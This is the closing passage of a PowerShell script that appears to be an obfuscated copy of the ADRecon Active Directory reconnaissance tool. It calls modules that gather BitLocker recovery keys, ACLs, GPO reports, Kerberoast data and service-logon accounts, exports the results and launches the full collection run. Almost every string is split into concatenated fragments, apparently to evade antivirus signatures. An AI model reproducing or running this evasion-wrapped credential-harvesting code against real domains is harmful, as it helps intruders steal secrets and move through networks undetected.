    If ($ADRBitLocker)
    {
        Write-Output ('[-] Bi'+'tLocker Re'+'covery Key'+'s - N'+'eed'+'s Privileged '+'Acc'+'ou'+'nt')
        $ADRObject = Get-ADRBitLocker -Method $Method -objDomain $objDomain -DomainController $DomainController -Credential $Credential
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ('B'+'it'+'LockerReco'+'ver'+'y'+'Ke'+'ys')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRBitLocker
    }
    If ($ADRACLs)
    {
        Write-Output ('[-] A'+'CLs - M'+'ay ta'+'k'+'e s'+'ome '+'t'+'ime')
        $ADRObject = Get-ADRACL -Method $Method -objDomain $objDomain -DomainController $DomainController -Credential $Credential -PageSize $PageSize -Threads $Threads
        Remove-Variable ADRACLs
    }
    If ($ADRGPOReport)
    {
        Write-Output ('[-] GP'+'O'+'R'+'ep'+'ort'+' - '+'M'+'ay take some time')
        Get-ADRGPOReport -Method $Method -UseAltCreds $UseAltCreds -ADROutputDir $ADROutputDir
        Remove-Variable ADRGPOReport
    }
    If ($ADRKerberoast)
    {
        Write-Output ('['+'-] Ker'+'beroast')
        $ADRObject = Get-ADRKerberoast -Method $Method -objDomain $objDomain -Credential $Credential -PageSize $PageSize
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ('Kerb'+'eroa'+'st')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRKerberoast
    }
    If ($ADRDomainAccountsusedforServiceLogon)
    {
        Write-Output ('[-] Domain'+' A'+'cc'+'ounts'+' us'+'ed'+' for Se'+'rvice Lo'+'gon'+' '+'- Needs'+' '+'Privile'+'g'+'ed '+'Accou'+'nt')
        $ADRObject = Get-ADRDomainAccountsusedforServiceLogon -Method $Method -objDomain $objDomain -Credential $Credential -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ('Dom'+'a'+'inAcc'+'ou'+'nt'+'s'+'us'+'edforSer'+'viceLogon')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRDomainAccountsusedforServiceLogon
    }

    $TotalTime = "{0:N2}" -f ((Get-DateDiff -Date1 (Get-Date) -Date2 $date).TotalMinutes)

    $AboutADRecon = Get-ADRAbout -Method $Method -date $date -ADReconVersion $ADReconVersion -Credential $Credential -RanonComputer $RanonComputer -TotalTime $TotalTime

    If ( ($OutputType -Contains ('CS'+'V')) -or ($OutputType -Contains ('XM'+'L')) -or ($OutputType -Contains ('JS'+'ON')) -or ($OutputType -Contains ('H'+'TML')) )
    {
        If ($AboutADRecon)
        {
            Export-ADR -ADRObj $AboutADRecon -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ('AboutA'+'DReco'+'n')
        }
        Write-Output "[*] Total Execution Time (mins): $($TotalTime) "
        Write-Output ('[*'+'] '+'O'+'ut'+'put '+'Dir'+'ectory'+': '+"$ADROutputDir")
        $ADRSTDOUT = $false
    }

    Switch ($OutputType)
    {
        ('S'+'TDOUT')
        {
            If ($ADRSTDOUT)
            {
                Write-Output "[*] Total Execution Time (mins): $($TotalTime) "
            }
        }
        ('HT'+'ML')
        {
            Export-ADR -ADRObj $(New-Object PSObject) -ADROutputDir $ADROutputDir -OutputType $([array] ('H'+'TML')) -ADRModuleName ('Inde'+'x')
        }
        ('EXC'+'EL')
        {
            Export-ADRExcel $ADROutputDir
        }
    }
    Remove-Variable TotalTime
    Remove-Variable AboutADRecon
    Set-Location $returndir
    Remove-Variable returndir

    If (($Method -eq ('AD'+'WS')) -and $UseAltCreds)
    {
        Remove-PSDrive ADR
    }

    If ($Method -eq ('LDA'+'P'))
    {
        $objDomain.Dispose()
        $objDomainRootDSE.Dispose()
    }

    If ($ADROutputDir)
    {
        Remove-EmptyADROutputDir $ADROutputDir $OutputType
    }

    Remove-Variable ADReconVersion
    Remove-Variable RanonComputer
}

If ($Log)
{
    Start-Transcript -Path "$(Get-Location)\ADRecon-Console-Log.txt"
}

Invoke-ADRecon -GenExcel $GenExcel -Method $Method -Collect $Collect -DomainController $DomainController -Credential $Credential -OutputType $OutputType -ADROutputDir $OutputDir -DormantTimeSpan $DormantTimeSpan -PassMaxAge $PassMaxAge -PageSize $PageSize -Threads $Threads

If ($Log)
{
    Stop-Transcript
}
